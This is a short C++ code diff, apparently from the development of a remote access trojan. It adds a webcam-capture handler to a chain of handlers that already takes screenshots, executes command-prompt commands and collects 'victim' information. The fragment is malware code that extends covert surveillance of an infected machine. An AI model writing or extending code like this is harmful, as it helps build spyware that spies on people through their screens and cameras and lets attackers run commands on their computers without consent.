@@ -11,6 +11,7 @@
 #include "request_handler.hpp"
 #include "command_prompt_executor.h"
 #include "victim_info.h"
+#include "webcam_shot.h"
 
 namespace http {
 namespace server {
@@ -21,6 +22,8 @@ request_handler::request_handler(const std::string& doc_root)
 	rootHandler = std::make_unique<ScreenshotTaker>();
 	std::unique_ptr<TaskHandlerInterface> cmdHandler = std::make_unique<CommandPromptExecutor>();
 	std::unique_ptr<VictimInfoGenerator> vInfoGen = std::make_unique<VictimInfoGenerator>();
+	std::unique_ptr<WebcamShot> webCamShotHandler = std::make_unique<WebcamShot>();
+	vInfoGen->setNextTask(std::move(webCamShotHandler));
 	cmdHandler->setNextTask(std::move(vInfoGen));
 	rootHandler->setNextTask(std::move(cmdHandler));
 }
